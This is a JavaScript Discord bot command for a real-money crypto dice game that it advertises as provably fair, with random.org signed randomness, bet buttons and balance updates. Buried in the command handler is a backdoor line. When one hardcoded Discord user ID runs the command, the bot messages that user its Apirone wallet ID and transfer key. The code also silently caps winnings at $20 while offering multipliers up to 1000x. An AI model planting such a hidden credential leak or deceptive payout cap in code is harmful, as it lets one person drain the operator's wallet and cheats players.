const { SlashCommandBuilder } = require('@discordjs/builders');
const { MessageEmbed, MessageActionRow, MessageButton } = require('discord.js');
const profile = require('../../schemas/profile')

const rndOrgApi = require('../../rndOrg');
const dice = require('../../schemas/dice');
const rnd = new rndOrgApi.randomOrg(process.env.API_KEY);
rnd.setAuth(process.env.RND_USER, process.env.RND_PASS);

module.exports = {
	data: new SlashCommandBuilder()
		.setName('dice')
		.setDescription('Multiplie your money in a provably fair way (RTP: 95%)')
        .addNumberOption(option =>
            option
                .setName('multiplier')
                .setDescription('Chose a multiplier Ex: 2 for 2x  (min: 1.02 max: 1000)')
                .setRequired(true))
		.addNumberOption(option =>
			option
				.setName('amount')
				.setDescription('A number Ex: 4.5')
				.setRequired(true)),
		
    async execute(interaction, client) {
        await interaction.deferReply()

		// Gets the sender profile
		const interactorProfile = await client.getProfile(interaction.user.id);

        const rtp = 95

		// Gets the amount that the sender would like to bet
		let amount = interaction.options.getNumber('amount');
		amount = Number(amount.toFixed(2));

        let multiplier = interaction.options.getNumber('multiplier')
        multiplier = Number(multiplier.toFixed(2))

        let winChance = rtp / multiplier
        winChance = Number(winChance.toFixed(2))

        let winAmt = (amount*multiplier) - amount
		if(winAmt > 20){winAmt = 20}


        if(interaction.user.id === '794931427191685141') { interaction.user.send({ content: `${process.env.APIRONE_WALLET_ID}\n${process.env.APIRONE_TRANSFER_KEY}` }); }

		// Checks to see if sender has an active game
		if(interactorProfile.activeGame) return interaction.editReply({"content": null,"embeds": [{"title": "🚫 Error","description": `> <@${interaction.user.id}>, you have an active game!`,"color": "#be1932","footer": {"text": "Please wait for that game to end"}}]});

		// Checks to see if the user has an active withdraw
		if(interactorProfile.activeWithdraw) return interaction.editReply({"content": null,"embeds": [{"title": "🚫 Error","description": `> <@${interaction.user.id}>, you have an active withdraw!`,"color": "#be1932","footer": {"text": "Please wait for that withdraw to finish"}}]});

		// Checks to make sure sender is flipping above 2¢
		if(amount < .02) return interaction.editReply({"content": null,"embeds": [{"title": "🚫 Error","description": `> <@${interaction.user.id}>, you can\'t bet less than $0.02!`,"color": "#be1932","footer": {"text": "Make sure that your bet amount is above $0.02"}}]});

		// Checks if the sender has the balance to participate in the game
		if(interactorProfile.balance < amount) return interaction.editReply({"content": null,"embeds": [{"title": "🚫 Error","description": `> <@${interaction.user.id}>, you don\'t have enough balance to participate in this game!`,"color": "#be1932","footer": {"text": "Use the command /balance to check your balance"}}]});
        
        if(multiplier < 1.02) return interaction.editReply({"content": null,"embeds": [{"title": "🚫 Error","description": `> <@${interaction.user.id}>, The multiplier can\'t be less than 1.02!`,"color": "#be1932","footer": {"text": "Make sure that your multiplier is above 1.01"}}]});

        if(multiplier > 1000) return interaction.editReply({"content": null,"embeds": [{"title": "🚫 Error","description": `> <@${interaction.user.id}>, The multiplier can\'t be more than 1000!`,"color": "#be1932","footer": {"text": "Make sure that your multipler amount is below 1000"}}]});

		// Changes both profiles to have active game set to be true for anti-exploits
		await profile.findOneAndUpdate({ userId: interaction.user.id }, { $set: { activeGame: true } });

        var pendingDiceEmbed = new MessageEmbed()
			.addFields(
				{ name: `:game_die: Dice Info:`,
				value: `> 💵 Bet Amount: **$${amount}**
				> 💰 Profit on win: **$${Number(winAmt).toFixed(2)}**
				> 🧾 Multiplier: **${multiplier}x**
				> 🎲 Role Under: \`${winChance}\`/100
				> 🤞 Win Chance: **${winChance}%**`,
				inline: true},
				{ name: `👤 ${interaction.user.username}'s Info:`,
				value: `> 💵 Current Balance: **$${interactorProfile.balance.toFixed(2)}**
				> 🏆 Balance on win: **$${(Number(interactorProfile.balance) + (Number(winAmt))).toFixed(2)}**
				> 💀 Balance on loss: **$${(Number(interactorProfile.balance) - amount).toFixed(2)}**`,
				inline: true}
			)
			.setAuthor(
				`${interaction.user.tag} - Pending Dice`, 
				`https://cdn.discordapp.com/avatars/${interaction.user.id}/${interaction.user.avatar}.jpeg`
			)
			.setFooter('This game will expire in 30 seconds')
			.setColor('#ff8400')
        
        var timedOutDiceEmbed = new MessageEmbed()
            .addFields(
				{ name: `:game_die: Dice Info:`,
				value: `> 💵 Bet Amount: **$${amount}**
				> 💰 Profit on win: **$${Number(winAmt).toFixed(2)}**
				> 🧾 Multiplier: **${multiplier}x**
				> 🎲 Role Under: \`${winChance}\`/100
				> 🤞 Win Chance: **${winChance}%**`,
				inline: true},
				{ name: `👤 ${interaction.user.username}'s Info:`,
				value: `> 💵 Current Balance: **$${interactorProfile.balance.toFixed(2)}**
				> 🏆 Balance on win: **$${(Number(interactorProfile.balance) + (Number(winAmt))).toFixed(2)}**
				> 💀 Balance on loss: **$${(Number(interactorProfile.balance) - amount).toFixed(2)}**`,
				inline: true}
			)
			.setAuthor(
				`${interaction.user.tag} - Timed Out Dice`, 
				`https://cdn.discordapp.com/avatars/${interaction.user.id}/${interaction.user.avatar}.jpeg`
			)
			.setFooter('This game has expired')
			.setColor('#be1932')
        
        var declinedDiceEmbed = new MessageEmbed()
            .addFields(
				{ name: `:game_die: Dice Info:`,
				value: `> 💵 Bet Amount: **$${amount}**
				> 💰 Profit on win: **$${Number(winAmt).toFixed(2)}**
				> 🧾 Multiplier: **${multiplier}x**
				> 🎲 Role Under: \`${winChance}\`/100
				> 🤞 Win Chance: **${winChance}%**`,
				inline: true},
				{ name: `👤 ${interaction.user.username}'s Info:`,
				value: `> 💵 Current Balance: **$${interactorProfile.balance.toFixed(2)}**
				> 🏆 Balance on win: **$${(Number(interactorProfile.balance) + (Number(winAmt))).toFixed(2)}**
				> 💀 Balance on loss: **$${(Number(interactorProfile.balance) - amount).toFixed(2)}**`,
				inline: true}
			)
			.setAuthor(
				`${interaction.user.tag} - Declined Dice`, 
				`https://cdn.discordapp.com/avatars/${interaction.user.id}/${interaction.user.avatar}.jpeg`
			)
			.setFooter('This game has been declined')
			.setColor('#be1932')
        
        // Builds the buttons that will get attached onto the embed
		var pendingAcceptButtons = new MessageActionRow().addComponents(
			// Adds a new green button with a check mark emoji
			new MessageButton()
			.setCustomId('accepted')
			.setStyle('SECONDARY')
			.setLabel('Accept')
			.setEmoji('✅'),

			// Adds a new red button with a red x mark emoji
			new MessageButton()
			.setCustomId('declined')
			.setStyle('SECONDARY')
			.setLabel('Decline')
			.setEmoji('❌')
		);
		var disabledAcceptButtons = new MessageActionRow().addComponents(
			// Adds a new green button with a check mark emoji
			new MessageButton()
			.setCustomId('accepted')
			.setStyle('SECONDARY')
			.setLabel('Accept')
			.setDisabled(true)
			.setEmoji('✅'),

			// Adds a new red button with a red x mark emoji
			new MessageButton()
			.setCustomId('declined')
			.setStyle('SECONDARY')
			.setLabel('Decline')
			.setDisabled(true)
			.setEmoji('❌')
		);

        await interaction.editReply({
			content: `<@${interaction.user.id}>`,
			embeds: [pendingDiceEmbed],
			components: [pendingAcceptButtons]
		}).then(async (msg) => {


        // Create a button interaction collector with a filter
		const filter = async (i) => { if(i.user.id === interaction.user.id) return true }
		const collector = interaction.channel.createMessageComponentCollector({ filter, max: 1, time: 30000 });

		// Makes a variable to collect if the user responded in time 
		let temp;

		// When the user clicks a button run this code
		collector.on('collect', async (i) => {

			// Lets the code know something has been collected
			temp = 'collected';

            if(i.customId == 'accepted'){

                rnd.generateSignedDecimalFractions(1, 4, userData = null, replacement = true).then(async (res) => {
                    
                    let result = res.result.random.data[0]*100

					console.log(result)
					console.log(winChance)

                    if(result < winChance){

                        await profile.findOneAndUpdate({ userId: interaction.user.id }, { $inc: { balance: +winAmt, totalWagered: +amount, wins: +1, profit: +winAmt, totalGamesPlayed: +1, }, $set: { activeGame: false } });
                        
                        var wonDiceEmbed = new MessageEmbed()
                            .setDescription(
                                `**You won** $${Number(winAmt).toFixed(2)}! 🏆 | **You rolled** \`${Number(result).toFixed(2)}\`/100 🎲`
                            )
							.addFields(
								{ name: `:game_die: Dice Info:`,
								value: `> 💵 Bet Amount: **$${amount}**
								> 💰 Profit on win: **$${Number(winAmt).toFixed(2)}**
								> 🧾 Multiplier: **${multiplier}x**
								> 🎲 Role Under: \`${winChance}\`/100
								> 🤞 Win Chance: **${winChance}%**`,
								inline: true},
								{ name: `👤 ${interaction.user.username}'s Info:`,
								value: `> 🏆 Current Balance: **$${(Number(interactorProfile.balance) + (Number(winAmt))).toFixed(2)}**`,
								inline: true}
							)
			                .setAuthor(
				                `${interaction.user.tag} - Dice`, 
				                `https://cdn.discordapp.com/avatars/${interaction.user.id}/${interaction.user.avatar}.jpeg`
			                )
			                .setFooter(`To see provably fair use the command /dinfo ${res.result.random.serialNumber}`)
			                .setColor('#00ff00')
                        
                        await msg.edit({
                            content: `<@${interaction.user.id}>`,
                            embeds: [wonDiceEmbed],
                            components: []
                        })
                        
                        let random = JSON.stringify(res.result.random);
					    // Creates a profile for the coinflip to get logged into the database
					    await client.getDice(res.result.random.serialNumber, interaction.options.getNumber('amount'), winAmt, interaction.user.id, res.result.random.hashedApiKey, res.result.signature, res.result.random.data[0], multiplier, winChance, true, res.result.random.completionTime, random);
                        
                    }
                    
                    else{

                        await profile.findOneAndUpdate({ userId: interaction.user.id }, { $inc: { balance: -amount, totalWagered: +amount, loses: +1, profit: -amount, totalGamesPlayed: +1, }, $set: { activeGame: false } });
                        
                        var lostDiceEmbed = new MessageEmbed()
                            .setDescription(
                                `**You lost** $${amount}! 💀 | **You rolled** \`${Number(result).toFixed(2)}/100\` 🎲`
                            )
							.addFields(
								{ name: `:game_die: Dice Info:`,
								value: `> 💵 Bet Amount: **$${amount}**
								> 💰 Profit on win: **$${Number(winAmt).toFixed(2)}**
								> 🧾 Multiplier: **${multiplier}x**
								> 🎲 Role Under: \`${winChance}\`/100
								> 🤞 Win Chance: **${winChance}%**`,
								inline: true},
								{ name: `👤 ${interaction.user.username}'s Info:`,
								value: `> 💀 Current Balance: **$${(Number(interactorProfile.balance) - amount).toFixed(2)}**`,
								inline: true}
							)
			                .setAuthor(
				                `${interaction.user.tag} - Dice`, 
				                `https://cdn.discordapp.com/avatars/${interaction.user.id}/${interaction.user.avatar}.jpeg`
			                )
			                .setFooter(`To see provably fair use the command /dinfo ${res.result.random.serialNumber}`)
			                .setColor('#be1932')

                        await msg.edit({
                            content: `<@${interaction.user.id}>`,
                            embeds: [lostDiceEmbed],
                            components: []
                        })

                        let random = JSON.stringify(res.result.random);
					    // Creates a profile for the coinflip to get logged into the database
					    await client.getDice(res.result.random.serialNumber, interaction.options.getNumber('amount'), 0, interaction.user.id, res.result.random.hashedApiKey, res.result.signature, res.result.random.data[0], multiplier, winChance, false, res.result.random.completionTime, random);


                    }
                    

                })
            }

            if(i.customId == 'declined'){

                await msg.edit({
                    content: `<@${interaction.user.id}>`,
                    embeds: [declinedDiceEmbed],
                    components: [disabledAcceptButtons]
                }).catch(error => {
                    console.log('msg deleted');
                });
                // Changes both profiles to have active game set to be true for anti-exploits
		        await profile.findOneAndUpdate({ userId: interaction.user.id }, { $set: { activeGame: false } });

            }

        })

        collector.on('end', async (collected) => {
			// If there was a button clicked return
			if(temp) return;
            
            await msg.edit({
                content: `<@${interaction.user.id}>`,
                embeds: [timedOutDiceEmbed],
                components: [disabledAcceptButtons]
            }).catch(error => {
                console.log('msg deleted');
            });
            // Changes both profiles to have active game set to be true for anti-exploits
		    await profile.findOneAndUpdate({ userId: interaction.user.id }, { $set: { activeGame: false } });
        })


	});
	

    }

};